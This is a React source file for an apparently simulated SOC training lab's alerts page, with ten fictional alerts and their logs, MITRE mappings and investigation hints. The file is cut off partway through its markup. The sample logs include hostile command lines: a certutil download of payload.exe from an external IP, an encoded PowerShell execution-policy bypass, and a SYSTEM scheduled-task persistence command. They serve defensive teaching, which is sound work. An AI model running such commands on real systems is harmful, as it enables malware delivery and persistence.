import { useState } from "react";
import { Link } from "react-router-dom";
import { cn } from "@/lib/utils";
import {
  Search, X, Play, ThumbsUp, ThumbsDown, XCircle,
  ChevronDown, Bell, User, RefreshCw, Clock,
  FileText, Lightbulb, Terminal, Shield, ChevronRight,
} from "lucide-react";
import logo from "@/assets/infosecdairies-logo.png";

// ── Types ──────────────────────────────────────────────────────
interface Alert {
  id: string;
  title: string;
  description: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  logSource: string;
  hostname: string;
  username: string;
  mitreTechnique: string;
  mitreId: string;
  timestamp: string;
  status: "Open" | "Investigating" | "Closed";
  relatedLogs: string[];
  investigationHints: string[];
  rawLog: string;
}

// ── Data ───────────────────────────────────────────────────────
const alertsData: Alert[] = [
  {
    id: "ALT-2026-0847",
    title: "Suspicious PowerShell Execution with Encoded Command",
    description: "A PowerShell process was spawned with a Base64-encoded command and execution policy bypass flag (-ep bypass -enc). This behavior is commonly associated with fileless malware, living-off-the-land techniques, and post-exploitation frameworks such as Cobalt Strike and Empire.",
    severity: "Critical",
    logSource: "Sysmon",
    hostname: "WKS-PC-0127",
    username: "jsmith",
    mitreTechnique: "Command and Scripting Interpreter: PowerShell",
    mitreId: "T1059.001",
    timestamp: "2026-01-21 14:32:18",
    status: "Open",
    relatedLogs: [
      "Sysmon Event ID 1 — Process Creation: powershell.exe -ep bypass -enc aQBlAHgA...",
      "Sysmon Event ID 3 — Network Connection: powershell.exe → 185.220.101.34:443",
      "Windows Security Event 4688 — New Process Created: powershell.exe (Parent: winword.exe)",
    ],
    investigationHints: [
      "Decode the Base64 string in the -enc parameter to reveal the actual PowerShell script.",
      "Check the parent process — if it's winword.exe or excel.exe, this may indicate a macro-based initial access.",
      "Look for subsequent Sysmon Event ID 3 (Network Connection) from powershell.exe to identify C2 communication.",
      "Search for Event ID 4104 (Script Block Logging) for the full deobfuscated script content.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 14:32:18.442","ProcessGuid":"{8a5f2c1d-4e8b-65a7-f100-000000002200}","ProcessId":7284,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -ep bypass -enc aQBlAHgA...","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","User":"CORP\\\\jsmith","IntegrityLevel":"Medium"}`,
  },
  {
    id: "ALT-2026-0846",
    title: "Brute Force Attack — Multiple Failed Logins",
    description: "Five consecutive failed login attempts detected from a single source IP address within a 2-minute window targeting domain user account. This pattern is consistent with password brute-force or credential stuffing attacks.",
    severity: "High",
    logSource: "Windows Event Logs",
    hostname: "DC-01",
    username: "admin_svc",
    mitreTechnique: "Brute Force",
    mitreId: "T1110",
    timestamp: "2026-01-21 14:28:45",
    status: "Investigating",
    relatedLogs: [
      "Windows Security Event 4625 — Failed Logon (x5): Source IP 192.168.1.105, Target: admin_svc",
      "Windows Security Event 4776 — Credential Validation: NTLM auth failure for admin_svc",
      "Firewall Log: 192.168.1.105 → DC-01:445 SMB connection (repeated)",
    ],
    investigationHints: [
      "Check if the source IP 192.168.1.105 is a known internal host or potentially compromised endpoint.",
      "Look for Event ID 4624 (Successful Logon) after the failed attempts — this would indicate the brute force succeeded.",
      "Review the Logon Type field — Type 3 (Network) vs Type 10 (RDP) tells you the attack vector.",
      "Check if the targeted account 'admin_svc' is a service account with elevated privileges.",
    ],
    rawLog: `{"EventID":4625,"TimeCreated":"2026-01-21T14:28:45.123Z","Computer":"DC-01.corp.local","SubjectUserName":"-","TargetUserName":"admin_svc","TargetDomainName":"CORP","Status":"0xc000006d","LogonType":3,"IpAddress":"192.168.1.105"}`,
  },
  {
    id: "ALT-2026-0845",
    title: "Large Outbound Data Transfer to External IP",
    description: "An internal host initiated a large data transfer (2.3 GB) to an external IP address not present in any threat intelligence whitelist. The transfer used HTTPS on a non-standard port, which is a common data exfiltration technique.",
    severity: "High",
    logSource: "Firewall",
    hostname: "WKS-PC-0042",
    username: "mwilliams",
    mitreTechnique: "Exfiltration Over C2 Channel",
    mitreId: "T1041",
    timestamp: "2026-01-21 14:25:12",
    status: "Open",
    relatedLogs: [
      "Firewall Log: 10.0.0.42 → 91.215.85.17:8443 (HTTPS) — 2.3 GB transferred",
      "DNS Log: Resolution for cdn-update-service.com → 91.215.85.17",
      "Proxy Log: CONNECT 91.215.85.17:8443 — User-Agent: Mozilla/5.0 (unusual string)",
    ],
    investigationHints: [
      "Check if the external IP 91.215.85.17 appears in threat intelligence feeds (VirusTotal, AbuseIPDB).",
      "Investigate the domain 'cdn-update-service.com' — is it a legitimate CDN or a C2 domain?",
      "Review the volume and timing of the transfer — was this during business hours or after?",
      "Check what files were accessed on WKS-PC-0042 prior to the transfer using Sysmon File Create events.",
    ],
    rawLog: `{"timestamp":"2026-01-21T14:25:12Z","src_ip":"10.0.0.42","dst_ip":"91.215.85.17","dst_port":8443,"protocol":"TCP","action":"ALLOW","bytes_sent":2368709120,"bytes_recv":45312,"duration":1847}`,
  },
  {
    id: "ALT-2026-0844",
    title: "New Windows Service Installed on Domain Controller",
    description: "A new Windows service named 'SysHealthMonitor' was installed on the domain controller with LocalSystem privileges. The service binary is located in a temp directory, which is highly suspicious.",
    severity: "Medium",
    logSource: "Windows Event Logs",
    hostname: "DC-01",
    username: "SYSTEM",
    mitreTechnique: "Create or Modify System Process: Windows Service",
    mitreId: "T1543.003",
    timestamp: "2026-01-21 14:22:33",
    status: "Closed",
    relatedLogs: [
      "Windows System Event 7045 — New Service: SysHealthMonitor, Path: C:\\Temp\\svcmon.exe",
      "Sysmon Event ID 11 — File Created: C:\\Temp\\svcmon.exe (SHA256: a3b4c5...)",
      "Sysmon Event ID 13 — Registry Value Set: HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysHealthMonitor",
    ],
    investigationHints: [
      "Check the hash of svcmon.exe against VirusTotal — a file in C:\\Temp is suspicious.",
      "Verify if 'SysHealthMonitor' is an approved service by checking the CMDB or change management system.",
      "Look at who installed the service — check Event ID 4688 for the parent process.",
      "Review if the service has started and what network connections it has made.",
    ],
    rawLog: `{"EventID":7045,"TimeCreated":"2026-01-21T14:22:33.891Z","Computer":"DC-01.corp.local","ServiceName":"SysHealthMonitor","ImagePath":"C:\\\\Temp\\\\svcmon.exe","ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}`,
  },
  {
    id: "ALT-2026-0843",
    title: "Internal Port Scan Activity Detected",
    description: "Sequential port scanning activity detected from an internal host. The host probed ports 21, 22, 23, 80, 135, 139, 443, 445, 3389, 8080 across 14 internal hosts within a 30-second window.",
    severity: "Medium",
    logSource: "Firewall",
    hostname: "WKS-PC-0088",
    username: "jdoe",
    mitreTechnique: "Network Service Discovery",
    mitreId: "T1046",
    timestamp: "2026-01-21 14:18:56",
    status: "Open",
    relatedLogs: [
      "Firewall Log: 172.16.0.88 → Multiple internal IPs, Ports: 21,22,23,80,135,139,443,445,3389,8080",
      "IDS Alert: ET SCAN Potential Nmap SYN Scan from 172.16.0.88",
      "Sysmon Event ID 3 — Network Connection: nmap.exe → various destinations",
    ],
    investigationHints: [
      "Check if this is an authorized vulnerability scan — verify with the IT security team schedule.",
      "Look for the process responsible — is it nmap, masscan, or a custom tool?",
      "Determine if jdoe's account has been compromised — check for anomalous login activity.",
      "Review which ports responded as open — these are potential lateral movement targets.",
    ],
    rawLog: `{"timestamp":"2026-01-21T14:18:56Z","src_ip":"172.16.0.88","events":[{"dst_ip":"172.16.0.10","dst_port":445,"action":"ALLOW"},{"dst_ip":"172.16.0.10","dst_port":3389,"action":"DENY"},{"dst_ip":"172.16.0.11","dst_port":22,"action":"ALLOW"}],"scan_type":"SYN","packets":847}`,
  },
  {
    id: "ALT-2026-0842",
    title: "Removable USB Storage Device Connected",
    description: "A USB mass storage device was connected to a workstation in the finance department. The device is not registered in the organization's approved hardware whitelist.",
    severity: "Low",
    logSource: "Sysmon",
    hostname: "WKS-FIN-003",
    username: "abrown",
    mitreTechnique: "Replication Through Removable Media",
    mitreId: "T1091",
    timestamp: "2026-01-21 14:15:21",
    status: "Closed",
    relatedLogs: [
      "Sysmon Event ID 6 — Driver Loaded: USBSTOR\\DISK&VEN_KINGSTON&PROD_DATATRAVELER",
      "Windows Security Event 6416 — New External Device Recognized",
      "DLP Log: File Copy Detected — Q4-Financial-Report.xlsx → E:\\",
    ],
    investigationHints: [
      "Check DLP logs for any sensitive files copied to the USB device.",
      "Verify if the user has authorization to use removable media per company policy.",
      "Look at the device serial number to determine if this is a known device.",
      "Review if any autorun or executable files were launched from the USB.",
    ],
    rawLog: `{"EventID":6,"UtcTime":"2026-01-21 14:15:21.003","ImageLoaded":"C:\\\\Windows\\\\System32\\\\drivers\\\\USBSTOR.SYS","DeviceInfo":"USBSTOR\\\\DISK&VEN_KINGSTON&PROD_DATATRAVELER&REV_1.0"}`,
  },
  {
    id: "ALT-2026-0841",
    title: "DNS Query to Known Malicious Domain",
    description: "A DNS resolution request was made to a domain flagged in multiple threat intelligence feeds as associated with command and control (C2) infrastructure for the APT29 threat group.",
    severity: "High",
    logSource: "Firewall",
    hostname: "WKS-PC-0156",
    username: "klee",
    mitreTechnique: "Application Layer Protocol: DNS",
    mitreId: "T1071.004",
    timestamp: "2026-01-21 14:12:09",
    status: "Investigating",
    relatedLogs: [
      "DNS Log: WKS-PC-0156 → update-check-srv.xyz (A Record) → 45.77.65.211",
      "Proxy Log: BLOCKED connection to 45.77.65.211:443 from WKS-PC-0156",
      "Sysmon Event ID 22 — DNS Query: rundll32.exe queried update-check-srv.xyz",
    ],
    investigationHints: [
      "The querying process is rundll32.exe — this is commonly abused for DLL side-loading.",
      "Check what DLL was loaded by rundll32 using Sysmon Event ID 7 (Image Loaded).",
      "Verify if the connection was blocked by the proxy — if not, C2 may be established.",
      "Search for the domain 'update-check-srv.xyz' in threat intel platforms for attribution.",
    ],
    rawLog: `{"EventID":22,"UtcTime":"2026-01-21 14:12:09.117","ProcessId":4892,"QueryName":"update-check-srv.xyz","QueryType":"A","QueryResults":"45.77.65.211","Image":"C:\\\\Windows\\\\System32\\\\rundll32.exe"}`,
  },
  {
    id: "ALT-2026-0840",
    title: "Scheduled Task Created with SYSTEM Privileges",
    description: "A new scheduled task was created that runs with SYSTEM-level privileges. The task is configured to execute a script from a user's AppData directory on system startup, which is a common persistence mechanism.",
    severity: "Medium",
    logSource: "Windows Event Logs",
    hostname: "WKS-PC-0078",
    username: "rjohnson",
    mitreTechnique: "Scheduled Task/Job: Scheduled Task",
    mitreId: "T1053.005",
    timestamp: "2026-01-21 14:08:44",
    status: "Open",
    relatedLogs: [
      "Windows Security Event 4698 — Scheduled Task Created: \\Microsoft\\Windows\\UpdateCheck",
      "Sysmon Event ID 1 — schtasks.exe /create /tn UpdateCheck /sc onstart /ru SYSTEM",
      "Sysmon Event ID 11 — File Created: C:\\Users\\rjohnson\\AppData\\Local\\Temp\\updchk.ps1",
    ],
    investigationHints: [
      "Review the contents of updchk.ps1 — does it download or execute anything from external sources?",
      "Check why a regular user (rjohnson) is creating tasks that run as SYSTEM — this requires elevated privileges.",
      "Look for Event ID 4672 (Special Privileges Assigned) to see if the user has admin tokens.",
      "Verify if 'UpdateCheck' is a legitimate Windows task or an attacker-created persistence mechanism.",
    ],
    rawLog: `{"EventID":4698,"TimeCreated":"2026-01-21T14:08:44.556Z","Computer":"WKS-PC-0078.corp.local","SubjectUserName":"rjohnson","TaskName":"\\\\Microsoft\\\\Windows\\\\UpdateCheck","RunAs":"NT AUTHORITY\\\\SYSTEM","Trigger":"AtStartup"}`,
  },
  {
    id: "ALT-2026-0839",
    title: "LSASS Memory Access — Credential Dumping",
    description: "A non-standard process accessed LSASS (Local Security Authority Subsystem Service) memory. This technique is used by tools like Mimikatz to extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory.",
    severity: "Critical",
    logSource: "EDR",
    hostname: "WKS-PC-0089",
    username: "SYSTEM",
    mitreTechnique: "OS Credential Dumping: LSASS Memory",
    mitreId: "T1003.001",
    timestamp: "2026-01-21 13:55:32",
    status: "Investigating",
    relatedLogs: [
      "Sysmon Event ID 10 — Process Accessed: notepad.exe → lsass.exe (GrantedAccess: 0x1010)",
      "EDR Alert: Suspicious LSASS access from PID 5544 (notepad.exe) — Mimikatz signature detected",
      "Windows Security Event 4663 — Object Access: lsass.exe memory read by notepad.exe",
    ],
    investigationHints: [
      "notepad.exe accessing LSASS is highly abnormal — this is likely a process injection or renamed binary.",
      "Check the hash of the 'notepad.exe' binary — is it the legitimate Windows notepad or a renamed tool?",
      "Look for Sysmon Event ID 8 (CreateRemoteThread) which indicates process injection into notepad.exe.",
      "Immediately check if any credentials were used for lateral movement after this event.",
    ],
    rawLog: `{"EventID":10,"UtcTime":"2026-01-21 13:55:32.998","SourceProcessId":5544,"SourceImage":"C:\\\\Windows\\\\System32\\\\notepad.exe","TargetProcessId":672,"TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010"}`,
  },
  {
    id: "ALT-2026-0838",
    title: "Macro-Enabled Document Spawned cmd.exe",
    description: "Microsoft Word spawned a cmd.exe child process, indicating a macro was executed. This is a classic initial access technique where malicious documents deliver payloads through VBA macros.",
    severity: "High",
    logSource: "Sysmon",
    hostname: "WKS-PC-0156",
    username: "mgarcia",
    mitreTechnique: "User Execution: Malicious File",
    mitreId: "T1204.002",
    timestamp: "2026-01-21 13:42:17",
    status: "Open",
    relatedLogs: [
      "Sysmon Event ID 1 — Process Creation: cmd.exe (Parent: WINWORD.EXE)",
      "Sysmon Event ID 15 — File Stream Created: Invoice-Q4-2025.docm:Zone.Identifier",
      "Sysmon Event ID 1 — cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe",
    ],
    investigationHints: [
      "The document 'Invoice-Q4-2025.docm' is a macro-enabled file — check where it was downloaded from.",
      "cmd.exe using certutil for downloading is a known LOLBin technique (T1105).",
      "Check if payload.exe was successfully downloaded and executed on the host.",
      "Look at the email gateway logs to find the original phishing email that delivered this document.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 13:42:17.224","ProcessId":8812,"Image":"C:\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","User":"CORP\\\\mgarcia"}`,
  },
];

const logSources = ["All Sources", "Windows Event Logs", "Sysmon", "Firewall", "EDR"];

const sevColors: Record<string, { row: string; badge: string; text: string }> = {
  Critical: { row: "border-l-red-600", badge: "bg-red-900/60 text-red-300 border-red-700/50", text: "text-red-400" },
  High:     { row: "border-l-orange-500", badge: "bg-orange-900/50 text-orange-300 border-orange-700/50", text: "text-orange-400" },
  Medium:   { row: "border-l-yellow-500", badge: "bg-yellow-900/50 text-yellow-300 border-yellow-700/50", text: "text-yellow-400" },
  Low:      { row: "border-l-blue-500", badge: "bg-blue-900/50 text-blue-300 border-blue-700/50", text: "text-blue-400" },
};

const statusColors: Record<string, string> = {
  Open: "text-red-400",
  Investigating: "text-yellow-400",
  Closed: "text-neutral-500",
};

// ── SOC Top‑Nav (enterprise style) ────────────────────────────
const socNavItems = [
  { label: "Dashboard", href: "/labs" },
  { label: "Alerts", href: "/labs/alerts" },
  { label: "Logs", href: "/labs/logs" },
  { label: "Investigations", href: "/labs/incidents" },
  { label: "MITRE ATT&CK", href: "/labs/threat-intel" },
  { label: "Leaderboard", href: "/labs/settings" },
];

// ── Component ──────────────────────────────────────────────────
const Alerts = () => {
  const [selectedSeverity, setSelectedSeverity] = useState("all");
  const [selectedStatus, setSelectedStatus] = useState("all");
  const [selectedSource, setSelectedSource] = useState("All Sources");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedAlert, setSelectedAlert] = useState<Alert | null>(null);
  const [timeRange, setTimeRange] = useState("24h");

  const filteredAlerts = alertsData.filter((a) => {
    if (selectedSeverity !== "all" && a.severity !== selectedSeverity) return false;
    if (selectedStatus !== "all" && a.status !== selectedStatus) return false;
    if (selectedSource !== "All Sources" && a.logSource !== selectedSource) return false;
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      if (![a.title, a.id, a.hostname, a.username, a.mitreId, a.logSource].some((f) => f.toLowerCase().includes(q))) return false;
    }
    return true;
  });

  const counts = {
    total: alertsData.length,
    critical: alertsData.filter((a) => a.severity === "Critical").length,
    high: alertsData.filter((a) => a.severity === "High").length,
    medium: alertsData.filter((a) => a.severity === "Medium").length,
    low: alertsData.filter((a) => a.severity === "Low").length,
    open: alertsData.filter((a) => a.status === "Open").length,
  };

  return (
    <div className="min-h-screen bg-[hsl(220,25%,5%)] text-neutral-300 flex flex-col">
      {/* ─── Top Navigation ─── */}
      <header className="h-10 bg-[hsl(220,20%,8%)] border-b border-neutral-800 flex items-center px-4 shrink-0">
        <Link to="/" className="flex items-center gap-2 mr-6">
          <img src={logo} alt="InfoSec Dairies" className="h-8 w-auto" />
        </Link>
        <nav className="flex items-center gap-0.5">
          {socNavItems.map((item) => (
            <Link
              key={item.label}
              to={item.href}
              className={cn(
                "px-3 py-1.5 text-[11px] font-medium rounded-sm transition-colors",
                item.label === "Alerts"
                  ? "bg-neutral-700/50 text-white"
                  : "text-neutral-500 hover:text-neutral-300 hover:bg-neutral-800/50"
              )}
            >
              {item.label}
            </Link>
          ))}
        </nav>
        <div className="ml-auto flex items-center gap-3">
          <Bell className="w-3.5 h-3.5 text-neutral-500" />
          <div className="w-6 h-6 rounded-full bg-neutral-700 flex items-center justify-center">
            <User className="w-3 h-3 text-neutral-400" />
          </div>
        </div>
      </header>

      {/* ─── Page Title Bar ─── */}
      <div className="h-9 bg-[hsl(220,20%,7%)] border-b border-neutral-800/60 flex items-center px-5 shrink-0">
        <Shield className="w-3.5 h-3.5 text-neutral-500 mr-2" />
        <h1 className="text-sm font-semibold text-neutral-200 tracking-wide">SOC Alerts</h1>
        <span className="ml-3 text-[10px] font-mono text-neutral-600">{counts.total} total</span>
        <div className="ml-auto flex items-center gap-3 text-[10px] text-neutral-600">
          <span className="flex items-center gap-1">
            <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
            {counts.open} open
          </span>
          <span className="flex items-center gap-1">
            <Clock className="w-3 h-3" />
            Auto-refresh 30s
          </span>
          <button className="p-1 hover:text-neutral-400 transition-colors">
            <RefreshCw className="w-3 h-3" />
          </button>
        </div>
      </div>

      {/* ─── Filters Bar ─── */}
      <div className="bg-[hsl(220,20%,7%)] border-b border-neutral-800/60 px-5 py-2 flex flex-wrap items-center gap-2 shrink-0">
        {/* Search */}
        <div className="relative min-w-[220px] flex-1 max-w-sm">
          <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-neutral-600" />
          <input
            type="text"
            placeholder="Search alerts…"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full bg-[hsl(220,20%,10%)] border border-neutral-800 rounded px-3 pl-8 py-1.5 text-xs text-neutral-300 placeholder:text-neutral-600 focus:outline-none focus:border-neutral-600 transition-colors"
          />
        </div>

        {/* Severity pills */}
        <div className="flex items-center gap-px bg-[hsl(220,20%,10%)] rounded border border-neutral-800 p-px">
          {[
            { key: "all", label: "All", count: counts.total, color: "" },
            { key: "Critical", label: "CRIT", count: counts.critical, color: "bg-red-500" },
            { key: "High", label: "HIGH", count: counts.high, color: "bg-orange-500" },
            { key: "Medium", label: "MED", count: counts.medium, color: "bg-yellow-500" },
            { key: "Low", label: "LOW", count: counts.low, color: "bg-blue-500" },
          ].map((f) => (
            <button
              key={f.key}
              onClick={() => setSelectedSeverity(f.key)}
              className={cn(
                "flex items-center gap-1.5 px-2.5 py-1 text-[10px] font-semibold rounded-sm transition-all tracking-wide",
                selectedSeverity === f.key
                  ? "bg-neutral-700/60 text-neutral-200"
                  : "text-neutral-500 hover:text-neutral-300"
              )}
            >
              {f.color && <span className={cn("w-1.5 h-1.5 rounded-full", f.color)} />}
              {f.label}
              <span className="text-[9px] opacity-50 font-mono">{f.count}</span>
            </button>
          ))}
        </div>

        {/* Status dropdown */}
        <select
          value={selectedStatus}
          onChange={(e) => setSelectedStatus(e.target.value)}
          className="bg-[hsl(220,20%,10%)] border border-neutral-800 rounded px-2.5 py-1.5 text-[11px] text-neutral-400 focus:outline-none focus:border-neutral-600 cursor-pointer"
        >
          <option value="all">Status: All</option>
          <option value="Open">Open</option>
          <option value="Investigating">Investigating</option>
          <option value="Closed">Closed</option>
        </select>

        {/* Source dropdown */}
        <select
          value={selectedSource}
          onChange={(e) => setSelectedSource(e.target.value)}
          className="bg-[hsl(220,20%,10%)] border border-neutral-800 rounded px-2.5 py-1.5 text-[11px] text-neutral-400 focus:outline-none focus:border-neutral-600 cursor-pointer"
        >
          {logSources.map((s) => (
            <option key={s} value={s}>{s}</option>
          ))}
        </select>

        {/* Time range */}
        <select
          value={timeRange}
          onChange={(e) => setTimeRange(e.target.value)}
          className="bg-[hsl(220,20%,10%)] border border-neutral-800 rounded px-2.5 py-1.5 text-[11px] text-neutral-400 focus:outline-none focus:border-neutral-600 cursor-pointer"
        >
          <option value="1h">Last 1h</option>
          <option value="6h">Last 6h</option>
          <option value="24h">Last 24h</option>
          <option value="7d">Last 7d</option>
          <option value="30d">Last 30d</option>
        </select>
      </div>

      {/* ─── Main Content ─── */}
      <div className="flex flex-1 overflow-hidden">
        {/* ─── Alert Table ─── */}
        <div className={cn("flex-1 flex flex-col overflow-hidden transition-all", selectedAlert && "lg:w-1/2")}>
          {/* Table result count */}
          <div className="px-5 py-1.5 bg-[hsl(220,20%,6%)] border-b border-neutral-800/40 text-[10px] text-neutral-600 font-mono">
            {filteredAlerts.length} results
          </div>

          <div className="flex-1 overflow-auto">
            <table className="w-full text-[11px]">
              <thead className="sticky top-0 z-10">
                <tr className="bg-[hsl(220,18%,10%)] border-b border-neutral-800 text-[10px] text-neutral-500 uppercase tracking-widest font-semibold">
                  <th className="text-left pl-5 pr-2 py-2 w-[52px]">Sev</th>
                  <th className="text-left px-2 py-2 w-[110px]">Alert ID</th>
                  <th className="text-left px-2 py-2">Alert Name</th>
                  <th className="text-left px-2 py-2 hidden xl:table-cell w-[120px]">Source</th>
                  <th className="text-left px-2 py-2 hidden lg:table-cell w-[100px]">Hostname</th>
                  <th className="text-left px-2 py-2 hidden xl:table-cell w-[80px]">User</th>
                  <th className="text-left px-2 py-2 hidden lg:table-cell w-[90px]">MITRE</th>
                  <th className="text-left px-2 py-2 hidden md:table-cell w-[140px]">Time Generated</th>
                  <th className="text-left px-2 py-2 pr-5 w-[90px]">Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredAlerts.map((alert) => {
                  const sev = sevColors[alert.severity];
                  const isSelected = selectedAlert?.id === alert.id;

                  return (
                    <tr
                      key={alert.id}
                      onClick={() => setSelectedAlert(isSelected ? null : alert)}
                      className={cn(
                        "border-b border-neutral-800/30 border-l-2 cursor-pointer transition-colors",
                        sev.row,
                        isSelected
                          ? "bg-neutral-800/40"
                          : "hover:bg-neutral-800/20"
                      )}
                    >
                      {/* Severity */}
                      <td className="pl-5 pr-2 py-2">
                        <span className={cn("inline-block px-1.5 py-px rounded text-[9px] font-bold uppercase tracking-wide border", sev.badge)}>
                          {alert.severity === "Critical" ? "CRIT" : alert.severity === "Medium" ? "MED" : alert.severity.toUpperCase()}
                        </span>
                      </td>
                      {/* Alert ID */}
                      <td className="px-2 py-2 font-mono text-neutral-500">{alert.id}</td>
                      {/* Title */}
                      <td className="px-2 py-2">
                        <span className={cn("truncate block max-w-[320px]", isSelected ? "text-white" : "text-neutral-300")}>
                          {alert.title}
                        </span>
                      </td>
                      {/* Source */}
                      <td className="px-2 py-2 hidden xl:table-cell text-neutral-500">{alert.logSource}</td>
                      {/* Hostname */}
                      <td className="px-2 py-2 hidden lg:table-cell font-mono text-neutral-500">{alert.hostname}</td>
                      {/* User */}
                      <td className="px-2 py-2 hidden xl:table-cell text-neutral-500">{alert.username}</td>
                      {/* MITRE */}
                      <td className="px-2 py-2 hidden lg:table-cell">
                        <span className="font-mono text-[10px] text-neutral-400">{alert.mitreId}</span>
                      </td>
                      {/* Time */}
                      <td className="px-2 py-2 hidden md:table-cell font-mono text-neutral-600">{alert.timestamp}</td>
                      {/* Status */}
                      <td className="px-2 py-2 pr-5">
                        <span className={cn("text-[10px] font-semibold uppercase tracking-wide", statusColors[alert.status])}>
                          {alert.status}
                        </span>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>

            {filteredAlerts.length === 0 && (
              <div className="text-center py-20 text-neutral-600 text-xs">
                No alerts match the current filters.
              </div>
            )}
          </div>
        </div>

        {/* ─── Investigation Panel ─── */}
        {selectedAlert && (
          <div className="hidden lg:flex w-[460px] xl:w-[520px] flex-col border-l border-neutral-800 bg-[hsl(220,20%,7%)] overflow-hidden">
            {/* Panel header */}
            <div className="h-9 px-4 flex items-center justify-between border-b border-neutral-800 bg-[hsl(220,18%,9%)] shrink-0">
              <div className="flex items-center gap-2">
                <ChevronRight className="w-3 h-3 text-neutral-600" />
                <span className="text-[11px] font-semibold text-neutral-300">Alert Investigation</span>
              </div>
              <button onClick={() => setSelectedAlert(null)} className="p-1 text-neutral-600 hover:text-neutral-300 transition-colors">
                <X className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Panel body */}
            <div className="flex-1 overflow-auto">
              {/* Alert overview */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="flex items-center gap-2 mb-1.5">
                  <span className={cn("px-1.5 py-px rounded text-[9px] font-bold uppercase border", sevColors[selectedAlert.severity].badge)}>
                    {selectedAlert.severity}
                  </span>
                  <span className="text-[10px] font-mono text-neutral-600">{selectedAlert.id}</span>
                  <span className={cn("text-[10px] font-semibold uppercase ml-auto", statusColors[selectedAlert.status])}>
                    {selectedAlert.status}
                  </span>
                </div>
                <h3 className="text-sm font-semibold text-neutral-200 mb-1.5">{selectedAlert.title}</h3>
                <p className="text-[11px] text-neutral-500 leading-relaxed">{selectedAlert.description}</p>
              </div>

              {/* Metadata */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="grid grid-cols-2 gap-x-4 gap-y-2">
                  {[
                    { l: "Log Source", v: selectedAlert.logSource },
                    { l: "Hostname", v: selectedAlert.hostname, mono: true },
                    { l: "Username", v: selectedAlert.username },
                    { l: "MITRE ID", v: selectedAlert.mitreId, mono: true },
                    { l: "MITRE Technique", v: selectedAlert.mitreTechnique },
                    { l: "Timestamp", v: selectedAlert.timestamp, mono: true },
                  ].map((m) => (
                    <div key={m.l}>
                      <span className="text-[9px] text-neutral-600 uppercase tracking-wider block">{m.l}</span>
                      <span className={cn("text-[11px] text-neutral-300", m.mono && "font-mono")}>{m.v}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Related Logs */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="flex items-center gap-1.5 mb-2">
                  <FileText className="w-3 h-3 text-neutral-500" />
                  <span className="text-[10px] font-semibold text-neutral-400 uppercase tracking-wider">Related Logs</span>
                </div>
                <div className="space-y-1">
                  {selectedAlert.relatedLogs.map((log, i) => (
                    <div key={i} className="px-2.5 py-1.5 bg-[hsl(220,20%,9%)] rounded border border-neutral-800/50 text-[10px] font-mono text-neutral-500 leading-relaxed">
                      {log}
                    </div>
                  ))}
                </div>
              </div>

              {/* Raw Log */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="flex items-center gap-1.5 mb-2">
                  <Terminal className="w-3 h-3 text-neutral-500" />
                  <span className="text-[10px] font-semibold text-neutral-400 uppercase tracking-wider">Raw Log Data</span>
                </div>
                <pre className="px-2.5 py-2 bg-[hsl(220,25%,4%)] rounded border border-neutral-800 text-[10px] font-mono text-neutral-600 overflow-x-auto whitespace-pre-wrap break-all leading-relaxed max-h-40">
                  {JSON.stringify(JSON.parse(selectedAlert.rawLog), null, 2)}
                </pre>
              </div>

              {/* MITRE ATT&CK Mapping */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="flex items-center gap-1.5 mb-2">
                  <Shield className="w-3 h-3 text-neutral-500" />
                  <span className="text-[10px] font-semibold text-neutral-400 uppercase tracking-wider">MITRE ATT&CK Mapping</span>
                </div>
                <div className="px-2.5 py-2 bg-[hsl(220,20%,9%)] rounded border border-neutral-800/50">
                  <span className="text-[10px] font-mono text-neutral-400">{selectedAlert.mitreId}</span>
                  <span className="text-[10px] text-neutral-600 mx-1.5">—</span>
                  <span className="text-[10px] text-neutral-400">{selectedAlert.mitreTechnique}</span>
                </div>
              </div>

              {/* Investigation Hints */}
              <div className="px-4 py-3 border-b border-neutral-800/60">
                <div className="flex items-center gap-1.5 mb-2">
                  <Lightbulb className="w-3 h-3 text-yellow-600" />
                  <span className="text-[10px] font-semibold text-neutral-400 uppercase tracking-wider">Investigation Hints</span>
                </div>
                <div className="space-y-1">
                  {selectedAlert.investigationHints.map((hint, i) => (
                    <div key={i} className="flex gap-2 px-2.5 py-1.5 bg-yellow-950/20 rounded border border-yellow-900/20">
                      <span className="text-yellow-700 text-[10px] font-bold mt-px shrink-0">{i + 1}.</span>
                      <span className="text-[10px] text-neutral-500 leading-relaxed">{hint}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Action buttons — fixed bottom */}
            <div className="px-4 py-2.5 border-t border-neutral-800 bg-[hsl(220,18%,9%)] shrink-0">
              <span className="text-[9px] text-neutral-600 uppercase tracking-widest font-semibold block mb-2">SOC Analyst Actions</span>
              <div className="grid grid-cols-2 gap-1.5">
